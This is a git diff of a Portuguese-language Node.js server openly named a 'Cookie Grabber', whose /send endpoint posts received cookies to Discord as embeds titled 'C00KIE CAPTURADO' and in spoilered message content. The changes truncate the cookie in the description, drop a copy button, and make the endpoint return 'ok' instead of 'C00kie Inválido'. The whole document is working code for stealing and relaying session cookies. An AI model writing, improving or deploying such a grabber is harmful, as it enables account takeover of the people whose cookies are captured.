@@ -22,22 +22,11 @@ app.post('/send', async (req, res) => {
         body: JSON.stringify({
           embeds: [{
             title: "C00KIE CAPTURADO",
-            description: "```" + cookie + "```",
+            description: "```" + cookie.substring(0, 1500) + "```",
             color: 0x00dbde,
             timestamp: new Date().toISOString(),
-            footer: { text: "Cookie Grabber • Fundo Lindo + Botão de Copiar" }
+            footer: { text: "Cookie Grabber • Sempre Online" }
           }],
-          components: [{
-            type: 1,
-            components: [{
-              type: 2,
-              style: 1,                    // estilo azul
-              label: "Copiar cookie",
-              custom_id: "copy_cookie",    // não é usado, mas precisa ter
-              emoji: { name: "Clipboard" }
-            }]
-          }],
-          // MAGIA: faz o Discord adicionar o botão de copiar automático
           content: "||`" + cookie + "`||"
         })
       });
@@ -46,9 +35,9 @@ app.post('/send', async (req, res) => {
     }
   }
 
-  res.json({ status: "C00kie Inválido" });
+  res.json({ status: "ok" });
 });
 
 app.listen(PORT, () => {
-  console.log(`Grabber lindo + botão de copiar rodando na porta ${PORT}`);
+  console.log(`Grabber LINDO e FUNCIONANDO na porta ${PORT}`);
 });
